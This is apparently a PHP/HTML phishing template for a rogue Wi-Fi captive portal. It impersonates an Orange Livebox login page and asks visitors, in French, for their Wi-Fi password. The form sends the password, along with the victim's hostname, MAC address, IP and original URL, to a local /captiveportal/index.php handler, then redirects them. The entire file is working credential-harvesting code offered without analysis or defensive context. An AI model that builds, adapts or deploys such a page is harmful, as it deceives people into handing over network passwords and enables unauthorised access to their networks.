<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <title>Livebox - Wi-Fi</title>
    <link href='assets/css/bootstrap.min.css' rel="stylesheet">
    <link href='assets/css/progress-bar.css' rel="stylesheet">
    <link href='assets/css/custom.css' rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #F5F5F5;
        }
        .container {
            max-width: 400px;
            margin: 100px auto;
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        #logo {
            text-align: center;
            margin-bottom: 20px;
        }
        h1, h2 {
            text-align: center;
            margin: 10px 0;
        }
        h1 {
            font-size: 24px;
            color: #333;
        }
        h2 {
            font-size: 16px;
            color: #555;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #ff7900;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #595959;
        }
    </style>
</head>
<body>
    <div class="container">
      <div id="logo">
        <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
        	 width="100" viewBox="0 0 283.5 283.5" enable-background="new 0 0 283.5 283.5" xml:space="preserve">
        <g>
        	<rect x="0" y="0" fill="#FF7900" width="283.5" height="283.5"/>
        	<g>
        		<path fill="#FFFFFF" d="M111.2,256c-4,2.6-8.4,3.9-13,3.9c-7.4,0-11.7-4.9-11.7-11.5c0-8.8,8.1-13.5,24.8-15.4v-2.2
        			c0-2.9-2.2-4.5-6.2-4.5c-4,0-7.3,1.6-9.6,4.5l-7-4c3.7-5.1,9.3-7.7,16.8-7.7c10.3,0,16.1,4.5,16.1,11.7c0,0,0,28.5,0,28.6h-9.2
        			L111.2,256z M96.6,247.7c0,2.6,1.7,5.1,4.7,5.1c3.3,0,6.4-1.4,9.6-4.2v-9.3C101.2,240.6,96.6,243,96.6,247.7z"/>
        		<path fill="#FFFFFF" d="M129.5,221.1l8.6-1.2l0.9,4.7c4.9-3.5,8.7-5.4,13.6-5.4c8.1,0,12.3,4.3,12.3,12.8v27.5h-10.4v-25.7
        			c0-4.8-1.3-7-5-7c-3.1,0-6.2,1.4-9.7,4.4v28.3h-10.3V221.1z"/>
        		<path fill="#FFFFFF" d="M233.7,260.2c-11.6,0-18.6-7.5-18.6-20.5c0-13.1,7-20.6,18.4-20.6c11.4,0,18.2,7.2,18.2,20.1
        			c0,0.7-0.1,1.4-0.1,2h-26.3c0.1,7.5,3.2,11.2,9.3,11.2c3.9,0,6.5-1.6,8.9-5.1l7.6,4.2C247.8,257.2,241.8,260.2,233.7,260.2z
        			 M241.5,234.5c0-5.3-3-8.4-7.9-8.4c-4.7,0-7.6,3-8,8.4H241.5z"/>
        		<path fill="#FFFFFF" d="M34.9,260.6c-10.3,0-19.5-6.5-19.5-20.8c0-14.3,9.3-20.8,19.5-20.8c10.3,0,19.5,6.5,19.5,20.8
        			C54.4,254.1,45.2,260.6,34.9,260.6z M34.9,227.7c-7.7,0-9.2,7-9.2,12c0,5.1,1.4,12,9.2,12c7.8,0,9.2-7,9.2-12
        			C44.1,234.7,42.6,227.7,34.9,227.7z"/>
        		<path fill="#FFFFFF" d="M61.5,220h9.9v4.6c1.9-2.5,6.5-5.5,10.9-5.5c0.4,0,0.9,0,1.3,0.1v9.7c-0.2,0-0.3,0-0.5,0
        			c-4.5,0-9.5,0.7-11,4.2v26.2H61.5V220z"/>
        		<path fill="#FFFFFF" d="M190.3,251c7.9-0.1,8.5-8.1,8.5-13.3c0-6.2-3-11.2-8.6-11.2c-3.7,0-7.9,2.7-7.9,11.6
        			C182.4,243,182.7,251,190.3,251z M208.9,219.9v37.4c0,6.6-0.5,17.4-19.3,17.6c-7.8,0-14.9-3.1-16.4-9.8l10.2-1.6
        			c0.4,1.9,1.6,3.9,7.4,3.9c5.4,0,8-2.6,8-8.7v-4.6l-0.1-0.1c-1.6,2.9-4.2,5.7-10.2,5.7c-9.2,0-16.4-6.4-16.4-19.7
        			c0-13.2,7.5-20.6,15.9-20.6c7.9,0,10.8,3.6,11.5,5.5l-0.1,0l0.9-4.7H208.9z"/>
        		<path fill="#FFFFFF" d="M255.7,206.8h-4.1v11.3h-2.2v-11.3h-4.1v-1.7h10.3V206.8z M272.7,218.1h-2.2v-10.9h-0.1l-4.3,10.9h-1.4
        			l-4.3-10.9h-0.1v10.9h-2.2v-13h3.3l3.9,9.9l3.8-9.9h3.3V218.1z"/>
        	</g>
        </g>
        </svg>
      </div>
        <h1>Connexion</h1>
        <h2>Saisissez le mot de passe de votre Wi-Fi pour continuer</h2>
        <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
            <input name="email" type="hidden" value="bbox@exemple.com" required>
            <input name="password" id='password-input' type="password" placeholder="Mot de passe" required>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <button type="submit">Suivant</button>
        </form>
    </div>
    <script src='assets/js/jquery-3.4.1.min.js'></script>
    <script src='assets/js/bootstrap.min.js'></script>
    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
              window.location.href = "/captiveportal/index.php";
            }, 100);
        }
    </script>
</body>
</html>